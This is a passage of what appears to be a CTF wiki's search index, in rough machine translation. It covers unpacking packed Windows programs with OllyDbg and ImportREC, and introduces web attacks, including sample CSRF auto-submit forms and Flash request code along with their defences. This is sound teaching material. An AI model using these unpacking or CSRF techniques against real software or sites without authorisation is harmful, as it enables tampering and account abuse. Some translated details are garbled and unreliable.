follows, we found OEP and reached the real entry point of the program. We need to dump the program. Right click, select &quot;Use OllyDump to unpack the debugging process&quot; (but you can also use LoadPE`) Dump out): A window pops up to see if the address is correct. The main thing is to check if the 'entry point address' has been selected. Then uncheck the 'Rebuild Input Table'. Name the dump file, I am named dump.exe here. Let's try to run dump.exe , we can find that the program can't run normally. For some simple shells, you dump it and it doesn't work. If you do find the correct OEP and use 'IDA to decompile and see the results well, then your first thought should be that the program &#39;IAT has a problem. You need to rebuild IAT . We need to use ImportREC to help fix the input table. Open ImportREC , select a running process original .exe ( original.exe is the process I am debugging in OD, EIP in OD is in OEP position, using Ollydump Do not close this process afterwards.). ImportREC repair input table entry point needs to know OEP , that is, input in the OEP input box in the middle of the right side of the window. As we know, in Ollydbg we know that the current entry point of the program is 0049C25C , and the mirror base address is 00400000 . So we need to fill in OEP here is 0009C25C We modify the OEP in ImportREC to 0009C25C and then click on 'AutoSearch`. A pop-up prompt box is displayed, \"The discovery may be the original IAT address\". We can click `Get Imports&#39; button to rebuild IAT . The left side will display the address of each imported function in IAT and whether it is valid. Obviously in the figure you can see ImportREC found in memory IAT Position and detect that each function is valid. We click on Fix Dump and open the file that was previously dumped using the OllyDump plugin, which is the dump.exe file. Then ImportREC will help restore the import table and generate the dump_.exe file. dump_.exe will run normally.","title":"example"},{"location":"reverse/windows/unpack/last-exception/","text":"The principle of the last exception method is that the program may trigger countless exceptions during self-extraction or self-decryption. If you can locate the last program exception, it may be close to the automatic shelling completion position. Now the last An exception method shelling can take advantage of Ollydbg's exception counter plugin, first record the number of exceptions, then reload, automatically stop at the last exception. \u8981\u70b9 \u00b6 Click on 'Options -> Debug Options -> Exceptions , remove all the \u221a inside! Press CTRL+F2` to reload the program. The start program is a jump, here we press SHIFT+F9 , until the program runs, write down the number of times to start from SHIFT+F9 to the program m ! CTRL+F2 reload the program, press SHIFT+F9 (the number of times this time is the program running times m-1 times) In the lower right corner of the OD we see a \" SE handle \", then we press CTRL+G and enter the address before the `SE handle'! Press F2 to break the point! Then press SHIFT+F9 to the breakpoint, F8 single step tracking example \u00b6 The sample program can be downloaded here: 5_last_exception.zip OD loader, uncheck all ignore exceptions in the menu Options -&gt; Debug Settings -&gt; Exceptions tab and then reload the program. We press Shift+F9 , the number of times the record is pressed, the program runs normally. What we want to get is the number of times the second to last press is pressed. In this example shift+F9 once, to the position of 0040CCD2 shift+F9 twice, the program runs normally Then we reload the program, just press 1 ( 2-1=1 ) Shift+F9 , go to the position of 0040CCD2 , observe the stack window, there is a SE handler: 0040CCD7 In the CPU window (assembly instruction), press Ctrl+G , enter 0040CCD7 , then press F2 here. That is, set a breakpoint at 0040CCD7 , then press Shift+F9 to run. Trigger a breakpoint. After triggering the breakpoint, step through the tracking. Down are some loops and jumps, we use F4 to skip the loop. Finally arrive at the following position Obviously in the final mov ebp, 0041010CC; jmp ebp is in the jump to OEP, we jump past as shown below: Obviously, we were lucky enough to come to OEP.","title":"Last Exception Method"},{"location":"reverse/windows/unpack/last-exception/#_1","text":"Click on 'Options -> Debug Options -> Exceptions , remove all the \u221a inside! Press CTRL+F2` to reload the program. The start program is a jump, here we press SHIFT+F9 , until the program runs, write down the number of times to start from SHIFT+F9 to the program m ! CTRL+F2 reload the program, press SHIFT+F9 (the number of times this time is the program running times m-1 times) In the lower right corner of the OD we see a \" SE handle \", then we press CTRL+G and enter the address before the `SE handle'! Press F2 to break the point! Then press SHIFT+F9 to the breakpoint, F8 single step tracking","title":"\u8981\u70b9"},{"location":"reverse/windows/unpack/last-exception/#example","text":"The sample program can be downloaded here: 5_last_exception.zip OD loader, uncheck all ignore exceptions in the menu Options -&gt; Debug Settings -&gt; Exceptions tab and then reload the program. We press Shift+F9 , the number of times the record is pressed, the program runs normally. What we want to get is the number of times the second to last press is pressed. In this example shift+F9 once, to the position of 0040CCD2 shift+F9 twice, the program runs normally Then we reload the program, just press 1 ( 2-1=1 ) Shift+F9 , go to the position of 0040CCD2 , observe the stack window, there is a SE handler: 0040CCD7 In the CPU window (assembly instruction), press Ctrl+G , enter 0040CCD7 , then press F2 here. That is, set a breakpoint at 0040CCD7 , then press Shift+F9 to run. Trigger a breakpoint. After triggering the breakpoint, step through the tracking. Down are some loops and jumps, we use F4 to skip the loop. Finally arrive at the following position Obviously in the final mov ebp, 0041010CC; jmp ebp is in the jump to OEP, we jump past as shown below: Obviously, we were lucky enough to come to OEP.","title":"example"},{"location":"reverse/windows/unpack/manually-fix-iat/","text":"The sample program can be downloaded from this link: manually_fix_iat.zip Our commonly used ImportREC shelling is the IAT auto search that comes with the software, but if we want to manually find the address of IAT and dump , what should we do? First use the ESP law, you can quickly jump to OEP: 00401110 . We right click and select `Find->call between all modules. Shows the list of functions called, we double-click on one of the functions (note that the double-click here should be the function of the program instead of the system function) We came to the function call Right click on follow to enter the function Then right click on the data window to follow -&gt; memory address Here, because the display is a hexadecimal value, it is not convenient to view, we can right-click in the data window and select long-&gt;address to display the function name. Note that we have to scroll up to the beginning of the IAT table. We can see that the initial function address is kernel.AddAtomA of 004050D8 . We find the last function down, which is the user32.MessageBoxA function. Look at the size of the entire IAT table. At the bottom of the OD there is a display of 'block size: 0x7C , so our entire IAT block size is 0x7C` Open ImportREC , select the program we are debugging, then enter OEP:1110, RVA:50D8, SIZE:7C , and then click Get Input Table . Here in the input table window, right click and select \"Advanced Command -> Select Code Block\". Then a pop-up window will appear, select the full dump, save as dump.exe file After the dump is complete, select Dump to file , here choose to repair the dump.exe we just dumped, get a dump\\_.exe . At this point, the whole shelling is completed.","title":"Manually Find the IAT and Rebuild It Using ImportREC"},{"location":"reverse/windows/unpack/memory/","text":"The memory mirroring method is to enter the virtual memory section of the program by the ALT's ALT+M shortcut when the packer is loaded. Then, by adding two memory one-time breakpoints, the correct OEP position of the program is reached. The principle of the memory mirroring method is that for the program resource segment and the code segment under the breakpoint, when the general program self-extracting or self-decrypting, the resource segment is first accessed to obtain the required resources, and then after the automatic shelling is completed, the program code segment is transferred back. At this time, the memory will be disconnected once, and the program will stop at OEP. \u8981\u70b9 \u00b6 Select 'Options -> Debug Options -> Exceptions from the menu. Check all ignore exceptions Press ALT+M to open the memory image, find the first .rsrc of the program, press F2 to break the point, then press SHIFT+F9 to run to the breakpoint. Press ALT+M again to open the memory image. Find the .text on the first .rsrc of the program (in the example, 00401000 ), press F2 to break the point. Then press SHIFT+F9 (or press F9 without exception) example \u00b6 The sample program can be downloaded here: 4_memory.zip OD loader, check all ignore exceptions in the menu item 'Options -> Debug Settings -> Exceptions tab>. Press Alt+M to open the memory image and find the resource segment, which is `srcrc of address=00407000 , size=00005000 , select F2 to break Go back to the CPU window, press F9 to run, the program is broken at 0040D75F Press Alt+M again to open the memory image and break the .text code snippet. Continue to run, the program is broken at 004010CC , which is OEP","title":"Memory Mirroring Method"},{"location":"reverse/windows/unpack/memory/#_1","text":"Select 'Options -> Debug Options -> Exceptions from the menu. Check all ignore exceptions Press ALT+M to open the memory image, find the first .rsrc of the program, press F2 to break the point, then press SHIFT+F9 to run to the breakpoint. Press ALT+M again to open the memory image. Find the .text on the first .rsrc of the program (in the example, 00401000 ), press F2 to break the point. Then press SHIFT+F9 (or press F9 without exception)","title":"\u8981\u70b9"},{"location":"reverse/windows/unpack/memory/#example","text":"The sample program can be downloaded here: 4_memory.zip OD loader, check all ignore exceptions in the menu item 'Options -> Debug Settings -> Exceptions tab>. Press Alt+M to open the memory image and find the resource segment, which is `srcrc of address=00407000 , size=00005000 , select F2 to break Go back to the CPU window, press F9 to run, the program is broken at 0040D75F Press Alt+M again to open the memory image and break the .text code snippet. Continue to run, the program is broken at 004010CC , which is OEP","title":"example"},{"location":"reverse/windows/unpack/packer-introduction/","text":"What is the shell? \u00b6 Shell is a program in some computer software that is specifically responsible for protecting software from unauthorized modification or decompilation. They generally run before the program, gain control, and then complete their task of protecting the software. Since this program and the shell of nature have many functions in the same place, based on the naming rules, such a program is called a shell. Shell classification \u00b6 We usually divide the shell** into two categories, one is a compression shell and the other is an encryption shell. Compressed shell \u00b6 Compressed shells have been around since the days of DOS, but at that time, due to limited computing power, the decompression overhead was too large and was not widely used. Using a compressed shell can help reduce the size of PE files, hide the internal code and resources of PE files, and facilitate network transmission and storage. Usually, there are two types of compression shells. One is just a compression shell for compressing ordinary PE files, and the other is a large deformation of the source file, which seriously damages the PE file header and is often used to compress malicious programs. Common compression shells are: Upx, ASpack, PECompat Encryption shell \u00b6 Encryption shells or protective cases, there are a variety of techniques to prevent reverse code analysis, its main function is to protect PE from code reverse analysis. Since the primary purpose of the Encryption Shell is no longer to compress file resources, the PE shell protected by the Encryption Shell is usually much larger than the original file. At present, the encryption shell is widely used for security-critical applications, and sensitive programs are also used to avoid (reduce) detection and killing of anti-virus software. Common encryption shells are: ASProtector, Armadillo, EXECryptor, Themida, VMProtect Shell loading process \u00b6 Save entry parameters \u00b6 The value of each register is saved when the packer is initialized. After the shell is executed, restore each register value. Finally jump to the original program execution Usually use the pushad / popad , pushfd / popfd command to save and restore the live environment Get the required function API \u00b6 There are only GetProcAddress , GetModuleHandle and LoadLibrary API functions in the input table of the general shell. If other API functions are required, map the DLL file to the calling process's address space via LoadLibraryA(W) or LoadLibraryExA(W) If the DLL file has been mapped into the address space of the calling process, you can call the GetModuleHandleA(W) function to get the DLL module handle. Once the DLL module is loaded, you can call the GetProcAddress function to get the address of the input function. Decrypting each block data \u00b6 For the purpose of protecting source code and data, each block of the source program file is generally encrypted. The shell decrypts these block data when the program is executed to make the program run normally. The shell is generally encrypted by block, decrypted by block, and the decrypted data is placed back in the appropriate memory location. Jump back to the original entry point \u00b6 Before jumping back to the entry point, the original PE file input form (IAT) will be restored and the relocation items (mainly DLL files) will be processed. Because the shell itself constructs an input table when packing, you need to re-acquire all the functions introduced by each DLL and fill in the IAT table. After completing the above work, the control will be transferred to the original program and continue to be executed.","title":"Introduction to the Protective case"},{"location":"reverse/windows/unpack/packer-introduction/#what-is-the-shell","text":"Shell is a program in some computer software that is specifically responsible for protecting software from unauthorized modification or decompilation. They generally run before the program, gain control, and then complete their task of protecting the software. Since this program and the shell of nature have many functions in the same place, based on the naming rules, such a program is called a shell.","title":"What is the shell?"},{"location":"reverse/windows/unpack/packer-introduction/#shell-classification","text":"We usually divide the shell** into two categories, one is a compression shell and the other is an encryption shell.","title":"Shell classification"},{"location":"reverse/windows/unpack/packer-introduction/#compressed-shell","text":"Compressed shells have been around since the days of DOS, but at that time, due to limited computing power, the decompression overhead was too large and was not widely used. Using a compressed shell can help reduce the size of PE files, hide the internal code and resources of PE files, and facilitate network transmission and storage. Usually, there are two types of compression shells. One is just a compression shell for compressing ordinary PE files, and the other is a large deformation of the source file, which seriously damages the PE file header and is often used to compress malicious programs. Common compression shells are: Upx, ASpack, PECompat","title":"Compressed shell"},{"location":"reverse/windows/unpack/packer-introduction/#encryption-shell","text":"Encryption shells or protective cases, there are a variety of techniques to prevent reverse code analysis, its main function is to protect PE from code reverse analysis. Since the primary purpose of the Encryption Shell is no longer to compress file resources, the PE shell protected by the Encryption Shell is usually much larger than the original file. At present, the encryption shell is widely used for security-critical applications, and sensitive programs are also used to avoid (reduce) detection and killing of anti-virus software. Common encryption shells are: ASProtector, Armadillo, EXECryptor, Themida, VMProtect","title":"Encryption shell"},{"location":"reverse/windows/unpack/packer-introduction/#shell-loading-process","text":"","title":"Shell loading process"},{"location":"reverse/windows/unpack/packer-introduction/#save-entry-parameters","text":"The value of each register is saved when the packer is initialized. After the shell is executed, restore each register value. Finally jump to the original program execution Usually use the pushad / popad , pushfd / popfd command to save and restore the live environment","title":"Save entry parameters"},{"location":"reverse/windows/unpack/packer-introduction/#get-the-required-function-api","text":"There are only GetProcAddress , GetModuleHandle and LoadLibrary API functions in the input table of the general shell. If other API functions are required, map the DLL file to the calling process's address space via LoadLibraryA(W) or LoadLibraryExA(W) If the DLL file has been mapped into the address space of the calling process, you can call the GetModuleHandleA(W) function to get the DLL module handle. Once the DLL module is loaded, you can call the GetProcAddress function to get the address of the input function.","title":"Get the required function API"},{"location":"reverse/windows/unpack/packer-introduction/#decrypting-each-block-data","text":"For the purpose of protecting source code and data, each block of the source program file is generally encrypted. The shell decrypts these block data when the program is executed to make the program run normally. The shell is generally encrypted by block, decrypted by block, and the decrypted data is placed back in the appropriate memory location.","title":"Decrypting each block data"},{"location":"reverse/windows/unpack/packer-introduction/#jump-back-to-the-original-entry-point","text":"Before jumping back to the entry point, the original PE file input form (IAT) will be restored and the relocation items (mainly DLL files) will be processed. Because the shell itself constructs an input table when packing, you need to re-acquire all the functions introduced by each DLL and fill in the IAT table. After completing the above work, the control will be transferred to the original program and continue to be executed.","title":"Jump back to the original entry point"},{"location":"reverse/windows/unpack/sfx/","text":"The \"SFX\" method takes advantage of the OEP search function that comes with Ollydbg. You can choose to stop the program directly at the OEP found by the OD. At this time, the decompression process of the shell is completed, and you can directly dump the program. \u8981\u70b9 \u00b6 Set OD, ignore all exceptions, that is, check the exception tab Switch to the SFX tab and select \"Byte mode to track the actual entry (very slow)\", OK Reload the program (if \"Block code?\" is selected, \"No\", OD directly reaches OEP) example \u00b6 The sample program can be downloaded here: 6_sfx.zip First we check all ignore exceptions in the menu Options -&gt; Debug Settings -&gt; Exceptions tab . Then switch to the SFX tab and click on \"Byte mode to track the real entrance (very slow)\" Overloading the program, the program has stopped at the code entry point, and there is no need to re-analyze the OEP.","title":"SFX Method"},{"location":"reverse/windows/unpack/sfx/#_1","text":"Set OD, ignore all exceptions, that is, check the exception tab Switch to the SFX tab and select \"Byte mode to track the actual entry (very slow)\", OK Reload the program (if \"Block code?\" is selected, \"No\", OD directly reaches OEP)","title":"\u8981\u70b9"},{"location":"reverse/windows/unpack/sfx/#example","text":"The sample program can be downloaded here: 6_sfx.zip First we check all ignore exceptions in the menu Options -&gt; Debug Settings -&gt; Exceptions tab . Then switch to the SFX tab and click on \"Byte mode to track the real entrance (very slow)\" Overloading the program, the program has stopped at the code entry point, and there is no need to re-analyze the OEP.","title":"example"},{"location":"reverse/windows/unpack/trace/","text":"The principle of the single-step tracking method is to go through the steps of (F8), step (F7) and run to (F4) of Ollydbg, completely go through the self-shelling process of the program, skip some fragments of the loop recovery code, and use the single Step to ensure that the program will not skip OEP. This way, after the software auto-hull module is finished running, it will reach OEP and dump the program. \u8981\u70b9 \u00b6 Open the program and press F8 to step down. Try to implement the downward jmp jump. You will often encounter large loops, then use F4 to skip the loop. If the function is not far away is a call (near call), then we try not to skip directly, but enter this call The jmp instruction with a large jump range is most likely to jump to the original program entry point (OEP). example \u00b6 The sample program can be downloaded here: 1_trace.zip The single-step tracking method is to go down the program entry point step by step. In the single-step process, pay attention to the EIP not to go wrong, but for some complicated shells, the single-step process will be extremely boring and easy. I confuse myself. So single-step tracking is also often used to analyze some key code parts (combined with static analysis), rather than completely from the beginning to the end, which is contrary to the concept of reverse engineering. Open the Notepad.exe in the archive with Ollydbg and stop at the location below. The entry point is a pushad that saves all register states to the stack, followed by a call call to the function at 0040D00A . After that, unconditionally jump to 459DD4F7 , then push ebp and retn obviously have no meaning. Like this entry point is a call we call near call , for near call us Select step, press F7 (of course you can only choose to step, or EIP will stop the program). After the stepping is a call , we continue to step, press F7, follow up and find that there is no near call, we can see the program in the GetModuleHandleA , GetProcAddress and other APIs, continue to analyze downwards. After that, we will encounter multiple jumps. We try to satisfy the downward jump. For the upward jump, we will not implement it and use F4 to jump out of the loop until 0040D3AF . We look at the following code. ` asm 0040D3AF 61 popad 0040D3B0 75 08 jnz short NotePad.0040D3BA 0040D3B2 B8 01000000 mov eax,0x1 0040D3B7 C2 0C00 direction 0xC 0040D3BA 68 CC104000 push NotePad.004010CC 0040D3BF C3 retn ``` Here popad can restore the state of the register saved at the program entry point, then jnz jumps to 0040D3BA , here uses push and retn to change EIP to 004010CC , also That is to say, after the shell decompresses the code and other resources, it will jump to push through jnz , then set EIP to the original entry point (OEP) and return by push and ret . Go to OEP, and then continue to execute the code of the original program. After we return to retn , we can see the following: Obviously, we went to a bunch of places where Ollydbg was mistaken for data. Obviously Ollydbg analysis error, we need to let Ollydbg re-analyze, we can right-click analysis-&gt;delete analysis from module. , or press ctrl+a`, which correctly displays the assembly instructions at OEP.","title":"Single Step Tracking Method"},{"location":"reverse/windows/unpack/trace/#_1","text":"Open the program and press F8 to step down. Try to implement the downward jmp jump. You will often encounter large loops, then use F4 to skip the loop. If the function is not far away is a call (near call), then we try not to skip directly, but enter this call The jmp instruction with a large jump range is most likely to jump to the original program entry point (OEP).","title":"\u8981\u70b9"},{"location":"reverse/windows/unpack/trace/#example","text":"The sample program can be downloaded here: 1_trace.zip The single-step tracking method is to go down the program entry point step by step. In the single-step process, pay attention to the EIP not to go wrong, but for some complicated shells, the single-step process will be extremely boring and easy. I confuse myself. So single-step tracking is also often used to analyze some key code parts (combined with static analysis), rather than completely from the beginning to the end, which is contrary to the concept of reverse engineering. Open the Notepad.exe in the archive with Ollydbg and stop at the location below. The entry point is a pushad that saves all register states to the stack, followed by a call call to the function at 0040D00A . After that, unconditionally jump to 459DD4F7 , then push ebp and retn obviously have no meaning. Like this entry point is a call we call near call , for near call us Select step, press F7 (of course you can only choose to step, or EIP will stop the program). After the stepping is a call , we continue to step, press F7, follow up and find that there is no near call, we can see the program in the GetModuleHandleA , GetProcAddress and other APIs, continue to analyze downwards. After that, we will encounter multiple jumps. We try to satisfy the downward jump. For the upward jump, we will not implement it and use F4 to jump out of the loop until 0040D3AF . We look at the following code. ` asm 0040D3AF 61 popad 0040D3B0 75 08 jnz short NotePad.0040D3BA 0040D3B2 B8 01000000 mov eax,0x1 0040D3B7 C2 0C00 direction 0xC 0040D3BA 68 CC104000 push NotePad.004010CC 0040D3BF C3 retn ``` Here popad can restore the state of the register saved at the program entry point, then jnz jumps to 0040D3BA , here uses push and retn to change EIP to 004010CC , also That is to say, after the shell decompresses the code and other resources, it will jump to push through jnz , then set EIP to the original entry point (OEP) and return by push and ret . Go to OEP, and then continue to execute the code of the original program. After we return to retn , we can see the following: Obviously, we went to a bunch of places where Ollydbg was mistaken for data. Obviously Ollydbg analysis error, we need to let Ollydbg re-analyze, we can right-click analysis-&gt;delete analysis from module. , or press ctrl+a`, which correctly displays the assembly instructions at OEP.","title":"example"},{"location":"reverse/windows/unpack/unpack-dll/","text":"Here you need to contact the previous section [Manually find IAT and use ImportREC to rebuild] (/reverse/unpack/manually-fix-iat/index.html) The example file can be downloaded here: unpack_dll.zip This step is required for Dll shelling. The most critical step for Dll shelling is to use LordPE to modify its Dll flag, open UnpackMe.dll with LordPE , and click on the feature value. ... , then uncheck the DLL` flag. After saving, the system will treat the file as an executable file. We changed the UnpackMe.dll suffix to UnpackMe.exe and loaded it with OD. Usually at the entry point, the program will save some information, here is very simple, just make a cmp . One thing to note is that the jnz jump here jumps directly to the end of the unpacking process. So we Need to modify the z flag of the register to invalidate the jump. Also set a breakpoint at the end of the unpacking process to avoid shelling and then run directly. (The program will break at this breakpoint, but the shell has been Finished, the code is very clear) The basic steps of Dll shelling are the same as the exe file shelling, and when rebuilding \u02bbIAT , you need to follow the previous article [Manually find IAT and use ImportREC to rebuild] (/reverse/unpack/manually-fix-iat /index.html) As mentioned, manually find the IAT table and rebuild it with ImportREC . Just note that after unpacking the dump, remember to restore the DLL flag with LordPE and append the file name. Change to .dll`.","title":"DLL File Unpacking"},{"location":"web/csrf/","text":"CSRF Introduction \u00b6 CSRF, full name Cross Site Request Forgery, cross-site request forgery. It is easy to confuse it with XSS. For CSRF, the two key points are the cross-site request and request forgery. Since the target station has no token or referer defense, each parameter of the user's sensitive operation can be known by the attacker. The attacker can forge a completely identical request to achieve malicious purposes as the user. CSRF type \u00b6 According to the request type, it can be divided into GET type and POST type. According to the attack method, it can be divided into HTML CSRF, JSON HiJacking, Flash CSRF, and so on. HTML CSRF \u00b6 The CSRF request is issued with HTML elements, which is the most common CSRF attack. Tags in the HTML that can be set to a link address such as src/href can initiate a GET request, such as: < link href = \"\" > < img src = \"\" > < img lowsrc = \"\" > < img dynsrc = \"\" > < meta http-equiv = \"refresh\" content = \"0; url=\" > < iframe src = \"\" > < frame src = \"\" > < script src = \"\" ></ script > < bgsound src = \"\" ></ bgsound > < embed src = \"\" ></ bgsound > < video src = \"\" ></ video > < audio src = \"\" ></ audio > < a href = \"\" ></ a > < table background = \"\" ></ table > ...... Also in the CSS style: @ import \"\" background : url ( \"\" ) ...... Forms can also be used to forge POST-type requests. < form action = \"http://www.a.com/register\" id = \"register\" method = \"post\" > < input type = text name = \"username\" value = \"\" /> < input type = password name = \"password\" value = \"\" /> </ form > < script > var f = document . getElementById ( \"register\" ); f . inputs [ 0 ]. value = \"test\" ; f . inputs [ 1 ]. value = \"passwd\" ; f . submit (); </ script > Flash CSRF \u00b6 Flash also has a variety of ways to initiate network requests, including POST. ` js import flash.net.URLRequest; import flash.system.Security; var url = new URLRequest(\" http://target/page \"); var param = new URLVariables (); param = \"test=123\"; url.method = \"POST\"; url.data = param; sendToURL(url); stop(); Flash can also use the methods `getURL`, `loadVars`, etc. to initiate a request. `` `js req = new LoadVars(); req.addRequestHeader(\"foo\", \"bar\"); req.send(\"http://target/page?v1=123&v2=222\", \"_blank\", \"GET\"); CSRF's defense \u00b6 Verification code \u00b6 The verification code forces the user to interact with the app to complete the final request. Referer Check \u00b6 Check if the request is from a legitimate source. But the server does not always get the Referer. Token \u00b6 The essential reason why CSRF can attack success is that all parameters of important operations can be guessed by the attacker. Keep the original parameters unchanged, add a parameter Token, the value is random, in the actual application, the Token can be placed in the user's Session, or in the browser's Cookies. Token must be random enough. In addition, the purpose of Token is not to prevent duplicate submissions, so for the convenience of use, it is allowed to use the same Token in the lifetime of a user before the Token is consumed, but if the user has already submitted the form, the Token has Consumed, the token should be regenerated. Token should also pay attention to its confidentiality. If the Token appears in the URL, it may be leaked through the Referer. Try to put the Token in the form, change the sensitive operation from GET to POST, submit it as a form or AJAX, avoid Token. Give way.","title":"CSRF Cross-Site Request Forgery"},{"location":"web/csrf/#csrf-introduction","text":"CSRF, full name Cross Site Request Forgery, cross-site request forgery. It is easy to confuse it with XSS. For CSRF, the two key points are the cross-site request and request forgery. Since the target station has no token or referer defense, each parameter of the user's sensitive operation can be known by the attacker. The attacker can forge a completely identical request to achieve malicious purposes as the user.","title":"CSRF Introduction"},{"location":"web/csrf/#csrf-type","text":"According to the request type, it can be divided into GET type and POST type. According to the attack method, it can be divided into HTML CSRF, JSON HiJacking, Flash CSRF, and so on.","title":"CSRF type"},{"location":"web/csrf/#html-csrf","text":"The CSRF request is issued with HTML elements, which is the most common CSRF attack. Tags in the HTML that can be set to a link address such as src/href can initiate a GET request, such as: < link href = \"\" > < img src = \"\" > < img lowsrc = \"\" > < img dynsrc = \"\" > < meta http-equiv = \"refresh\" content = \"0; url=\" > < iframe src = \"\" > < frame src = \"\" > < script src = \"\" ></ script > < bgsound src = \"\" ></ bgsound > < embed src = \"\" ></ bgsound > < video src = \"\" ></ video > < audio src = \"\" ></ audio > < a href = \"\" ></ a > < table background = \"\" ></ table > ...... Also in the CSS style: @ import \"\" background : url ( \"\" ) ...... Forms can also be used to forge POST-type requests. < form action = \"http://www.a.com/register\" id = \"register\" method = \"post\" > < input type = text name = \"username\" value = \"\" /> < input type = password name = \"password\" value = \"\" /> </ form > < script > var f = document . getElementById ( \"register\" ); f . inputs [ 0 ]. value = \"test\" ; f . inputs [ 1 ]. value = \"passwd\" ; f . submit (); </ script >","title":"HTML CSRF"},{"location":"web/csrf/#flash-csrf","text":"Flash also has a variety of ways to initiate network requests, including POST. ` js import flash.net.URLRequest; import flash.system.Security; var url = new URLRequest(\" http://target/page \"); var param = new URLVariables (); param = \"test=123\"; url.method = \"POST\"; url.data = param; sendToURL(url); stop(); Flash can also use the methods `getURL`, `loadVars`, etc. to initiate a request. `` `js req = new LoadVars(); req.addRequestHeader(\"foo\", \"bar\"); req.send(\"http://target/page?v1=123&v2=222\", \"_blank\", \"GET\");","title":"Flash CSRF"},{"location":"web/csrf/#csrfs-defense","text":"","title":"CSRF&#39;s defense"},{"location":"web/csrf/#verification-code","text":"The verification code forces the user to interact with the app to complete the final request.","title":"Verification code"},{"location":"web/csrf/#referer-check","text":"Check if the request is from a legitimate source. But the server does not always get the Referer.","title":"Referer Check"},{"location":"web/csrf/#token","text":"The essential reason why CSRF can attack success is that all parameters of important operations can be guessed by the attacker. Keep the original parameters unchanged, add a parameter Token, the value is random, in the actual application, the Token can be placed in the user's Session, or in the browser's Cookies. Token must be random enough. In addition, the purpose of Token is not to prevent duplicate submissions, so for the convenience of use, it is allowed to use the same Token in the lifetime of a user before the Token is consumed, but if the user has already submitted the form, the Token has Consumed, the token should be regenerated. Token should also pay attention to its confidentiality. If the Token appears in the URL, it may be leaked through the Referer. Try to put the Token in the form, change the sensitive operation from GET to POST, submit it as a form or AJAX, avoid Token. Give way.","title":"Token"},{"location":"web/introduction/","text":"With the birth of a series of new Internet products such as WEB 2.0, social network, Weibo, etc., Internet applications based on WEB environment are more and more extensive. In the process of enterprise informationization, various applications are set up on WEB platform, WEB business. The rapid development has also aroused strong concern of hackers. What followed is the emergence of WEB security threats. Hackers use the vulnerability of the operating system and the vulnerability of the WEB service program to gain control of the WEB server, and tamper with the content of the webpage. Stealing important internal data, and more serious, is to embed malicious code in web pages, causing website visitors to be compromised. In the CTF competition, WEB is also one of the most important directions. The WEB category has a wide variety of topics, and the knowledge points are fragmented and time-sensitive. It can keep up with the current hotspots and be close to actual combat. Topics in the WEB class include, but are not limited to, SQL injection, XSS cross-site scripting, CSRF cross-site request forgery, file uploading, file inclusion, framework security, PHP common vulnerabilities, code auditing, and more. SQL Injection \u00b6 By injecting SQL syntax into user-controllable parameters, the original SQL structure is destroyed, and the attack behavior of unexpected results when writing the program is achieved. The cause can be attributed to the superposition of the following two reasons: The programmer writes the SQL statement using string concatenation when dealing with application and database interactions. The user controllable parameters are not filtered enough to splicing the parameters into the SQL statement. XSS Cross-site scripting attack \u00b6 Cross Site Scripting is abbreviated to the abbreviation of Cascading Style Sheets (CSS), so the cross-site scripting attack is abbreviated as XSS. A malicious attacker inserts malicious HTML code into the WEB page. When the user browses the page, the HTML code embedded in the Web will be executed, thereby achieving the special purpose of maliciously attacking the user. Command Execution \u00b6 When an application needs to call some external program to process the content, some functions that execute system commands are used. For example, system , exec , shell_exec , etc. in PHP, when the user can control the parameters in the command execution function, the malicious system command can be injected into the normal command, causing the command execution attack. Here is mainly the introduction of command execution vulnerabilities mainly in PHP, and the details of Java and other applications are to be added. File contains \u00b6 If the client user input is allowed to control the files dynamically included in the server, it will lead to the execution of malicious code and the disclosure of sensitive information, mainly including local file inclusion and remote file inclusion. CSRF Cross-site request forgery \u00b6 Cross-Site Request Forgery (CSRF) is an attack that causes a logged-in user to perform some action without their knowledge. Because the attacker does not see the response to the fake request, the CSRF attack is mainly used to perform actions instead of stealing user data. When the victim is a normal user, CSRF can transfer the user's funds, send mail, etc. without their knowledge; but if the victim is a user with administrator rights, CSRF may threaten the entire WEB system. Safety. SSRF server-side request forgery \u00b6 SSRF (Server-Side Request Forgery) is a security vulnerability that is constructed by an attacker to form a request initiated by a server. In general, the target of an SSRF attack is an internal system that is inaccessible from the external network. File Upload \u00b6 In the operation of the website, it is inevitable to update some pages or contents of the website, and then the function of uploading files to the website is needed. If you do not restrict the restrictions or the restrictions are bypassed, this feature may be used to upload executable files, scripts to the server, and further cause the server to fall. Click to hijack \u00b6 Clickjacking was first created in 2008 by Internet security experts Robert Hansen and Jeremiah Grausman. It is a kind of visual spoofing. On the WEB side, the iframe is nested with a transparent and invisible page, so that the user can click on the location where the attacker wants to trick the user into clicking without knowing it. Due to the appearance of clickjacking, there is a way of anti-frame nesting, because clickjacking requires iframe nested pages to attack. The following code is the most common example of preventing frame nesting: ` js if(top.location!=location) top.location=self.location; ## VPS Virtual Private Server VPS (Virtual Private Server) technology, which divides a server into high-quality services for multiple virtual private servers. The technology for implementing VPS is divided into container technology and virtualization technology. In a container or virtual machine, each VPS can be assigned a separate public IP address, a separate operating system, and achieve isolation between different VPS disk space, memory, CPU resources, processes, and system configurations, simulating exclusive use for users and applications. The experience of using computing resources. VPS can reinstall the operating system, install programs, and restart the server separately, just like a standalone server. VPS provides users with the freedom to manage configurations for enterprise virtualization or for IDC resource leases. IDC resource rental, provided by the VPS provider. The difference in hardware VPS software used by different VPS providers and the different sales strategies, the VPS experience is also quite different. Especially when the VPS provider is oversold, the VPS performance will be greatly affected when the physical server is overloaded. Relatively speaking, container technology is more efficient and more expensive than virtual machine technology hardware, so the price of container VPS is generally lower than the price of virtual machine VPS. ## Conditional competition A conditional contention vulnerability is a server-side vulnerability. Because the server side processes concurrently when processing requests from different users, such problems may occur if the concurrent processing is improper or the logical sequence design of the related operations is unreasonable. . ## XXE XXE Injection is XML External Entity Injection, which is an XML external entity injection attack. Vulnerabilities are security issues caused when processing non-secure external entity data. In the XML 1.0 standard, the concept of entities is defined in the XML document structure. Entities can be called in the document by pre-definition, and the identifier of the entity can access local or remote content. If &quot;pollution&quot; is introduced in the process Sources, after processing XML documents, can lead to security issues such as information leakage. ## XSCH Due to the negligence of web developers in the development process using Flash, Silverlight, etc., the correct configuration of the cross-domain policy file (crossdomain.xml) did not cause problems. E.g: ```xml <cross-domain-policy> <allow-access-from domain=\u201c*\u201d/> </cross-domain-policy> Because the cross-domain policy file is configured as * , it means that any domain Flash can interact with it, which can initiate requests and get data. \u8d8a\u6743 (function level access missing) \u00b6 An unauthorized vulnerability is a common security vulnerability in web applications. Its threat is that an account can control the total station user data. Of course, this data is limited to the data corresponding to the vulnerability feature. The cause of the ultra-authority vulnerability is mainly because the developer over-trusts the data requested by the client when adding, deleting, modifying, 